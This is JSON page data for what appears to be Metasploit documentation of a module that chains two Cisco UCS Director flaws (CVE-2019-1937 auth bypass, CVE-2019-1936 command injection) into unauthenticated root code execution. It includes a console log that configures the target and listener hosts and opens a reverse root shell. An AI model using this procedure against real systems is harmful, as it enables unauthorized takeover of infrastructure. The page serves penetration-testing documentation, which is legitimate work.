{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/cisco_ucs_rce","result":{"data":{"moduleMetadataJson":{"id":"d01202a3-07dc-5ab3-9594-fd613c5495de","name":"Cisco UCS Director Unauthenticated Remote Code Execution","fullname":"exploit/linux/http/cisco_ucs_rce","description":"The Cisco UCS Director virtual appliance contains two flaws that can be combined\n        and abused by an attacker to achieve remote code execution as root.\n        The first one, CVE-2019-1937, is an authentication bypass, that allows the\n        attacker to authenticate as an administrator.\n        The second one, CVE-2019-1936, is a command injection in a password change form,\n        that allows the attacker to inject commands that will execute as root.\n        This module combines both vulnerabilities to achieve the unauthenticated command\n        injection as root.\n        It has been tested with Cisco UCS Director virtual machines 6.6.0 and 6.7.0.\n        Note that Cisco also mentions in their advisory that their IMC Supervisor and\n        UCS Director Express are also affected by these vulnerabilities, but this module\n        was not tested with those products.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/cisco_ucs_rce","documentationSlug":"/modules/documentation/exploit/linux/http/cisco_ucs_rce","referencesSlug":"/modules/references/exploit/linux/http/cisco_ucs_rce"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>The Cisco UCS Director virtual appliance contains two flaws that can be combined\nand abused by an attacker to achieve remote code execution as root.</p>\n<p>The first one, CVE-2019-1937, is an authentication bypass, that allows the\nattacker to authenticate as an administrator.</p>\n<p>The second one, CVE-2019-1936, is a command injection in a password change form,\nthat allows the attacker to inject commands that will execute as root.</p>\n<p>This module combines both vulnerabilities to achieve the unauthenticated command\ninjection as root.\nIt has been tested with Cisco UCS Director virtual machines 6.6.0 and 6.7.0.\nNote that Cisco also mentions in their advisory that their IMC Supervisor and\nUCS Director Express are also affected by these vulnerabilities, but this module\nwas not tested with those products.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>Setup RHOST, LHOST, LPORT and run it!</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/ssh/cisco_ucs_scpuser) &gt; use exploit/linux/http/cisco_ucs_rce\nmsf5 exploit(linux/http/cisco_ucs_rce) &gt; set rhost 10.9.8.121\nrhost =&gt; 10.9.8.121\nmsf5 exploit(linux/http/cisco_ucs_rce) &gt; set lhost 10.9.8.1\nlhost =&gt; 10.9.8.1\nmsf5 exploit(linux/http/cisco_ucs_rce) &gt; run\n\n[*] Started reverse TCP handler on 10.9.8.1:4444\n[+] 10.9.8.121:443 - Successfully bypassed auth and got our admin JSESSIONID cookie!\n[+] 10.9.8.121:443 - Shelly is here, press ENTER to start playing with her!\n[*] Command shell session 2 opened (10.9.8.1:4444 -&gt; 10.9.8.121:34778) at 2019-08-29 22:28:01 +0700\n\n[root@localhost inframgr]# whoami\nwhoami\nroot\n[root@localhost inframgr]# ^C\nAbort session 2? [y/N]  y\n&quot;&quot;\n\n[*] 10.9.8.121 - Command shell session 2 closed.  Reason: User exit\nmsf5 exploit(linux/http/cisco_ucs_rce) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"d01202a3-07dc-5ab3-9594-fd613c5495de"}}}